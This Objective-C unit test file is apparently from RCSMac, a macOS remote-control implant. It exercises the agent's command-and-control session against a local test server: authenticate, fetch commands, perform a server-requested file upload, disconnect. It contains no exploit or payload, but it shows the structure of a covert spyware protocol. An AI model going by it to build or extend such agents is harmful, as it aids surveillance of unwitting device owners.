/*
 *  UploadNetworkOperationTest.m
 *  RCSMac
 *
 *
 *  Created by revenge on 1/26/11.
 *  Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>
#import <GHUnit/GHUnit.h>

#import "UploadNetworkOperation.h"
#import "AuthNetworkOperation.h"
#import "IDNetworkOperation.h"
#import "ByeNetworkOperation.h"
#import "RCSMCommon.h"


static NSURL *mURL                      = nil;
static RESTTransport *mTransport        = nil;
static AuthNetworkOperation *mAuth      = nil;
static IDNetworkOperation *mID          = nil;
static UploadNetworkOperation *mUp      = nil;
static ByeNetworkOperation *mBye        = nil;

@interface UploadNetworkOperationTest : GHTestCase

@end

@implementation UploadNetworkOperationTest

- (BOOL)shouldRunOnMainThread
{
  // By default NO, but if you have a UI test or test dependent on running on the main thread return YES
  return NO;
}

- (void)setUpClass
{
  // Run at start of all tests in the class
  mURL = [[NSURL alloc] initWithString: @"http://192.168.1.153:8080/"];
}

- (void)tearDownClass
{
  // Run at end of all tests in the class
  [mURL release];
}

- (void)setUp
{
  // Run before each test method
  mTransport = [[RESTTransport alloc] initWithURL: mURL
                                           onPort: 8080];
  mAuth  = [[AuthNetworkOperation alloc]
            initWithTransport: mTransport];
  mID    = [[IDNetworkOperation alloc]
            initWithTransport: mTransport];
  mUp    = [[UploadNetworkOperation alloc]
            initWithTransport: mTransport];
  mBye   = [[ByeNetworkOperation alloc]
            initWithTransport: mTransport];
}

- (void)tearDown
{
  // Run after each test method
  [mAuth release];
  [mID release];
  [mUp release];
  [mBye release];
  [mTransport release];
}

- (void)testAllocation
{
  RESTTransport *transport = [[RESTTransport alloc] initWithURL: mURL
                                                         onPort: 80];
  
  UploadNetworkOperation *upOP = [[UploadNetworkOperation alloc]
                                  initWithTransport: transport];
  
  GHAssertNotNULL(upOP, nil, @"Error on allocation");
  
  [transport release];
  [upOP release];
}

- (void)testPerform
{
  BOOL result = NO;
  
  result = [mAuth perform];
  GHAssertTrue(result, @"Auth went wrong");
  
  result = [mID perform];
  GHAssertTrue(result, @"idOP went wrong");
  
  NSMutableArray *commandList = [mID getCommands];
  GHTestLog(@"commandList: %@", commandList);
  
  int i = 0;
  
  for (; i < [commandList count]; i++)
    {
      if ([[commandList objectAtIndex: i] unsignedIntValue] == PROTO_UPLOAD)
        {
          GHTestLog(@"Server requested a file upload");
          //BOOL success = YES;
          
          //id mockTaskManager = [OCMockObject partialMockForObject: [RCSMTaskManager sharedInstance]];
          //[[[mockTaskManager stub] andReturn: OCMOCK_VALUE(success)] _uploadFiles];
          
          result = [mUp perform];
          GHAssertTrue(result, @"upOP went wrong");
          
          i = 1337;
          break;
        }
    }
  
  GHAssertEquals(i, 1337, @"NO upload offered from server");
  
  result = [mBye perform];
  GHAssertTrue(result, @"Bye went wrong");
}

- (void)testWithNoRequestFromServer
{
  BOOL result = NO;
  
  result = [mAuth perform];
  GHAssertTrue(result, @"Auth went wrong");
  
  result = [mID perform];
  GHAssertTrue(result, @"idOP went wrong");
  
  NSMutableArray *commandList = [mID getCommands];
  GHTestLog(@"commandList: %@", commandList);
  
  int i = 0;
  
  for (; i < [commandList count]; i++)
    {
      if ([[commandList objectAtIndex: i] unsignedIntValue] == PROTO_UPLOAD)
        {
          i = 1337;
          break;
        }
    }
  
  GHAssertNotEquals(i, 1337, @"Server requested PROTO_UPLOAD, can't continue");
  
  result = [mUp perform];
  GHAssertFalse(result, @"upOP should have returned FALSE");
  
  result = [mBye perform];
  GHAssertTrue(result, @"Bye went wrong");
}

@end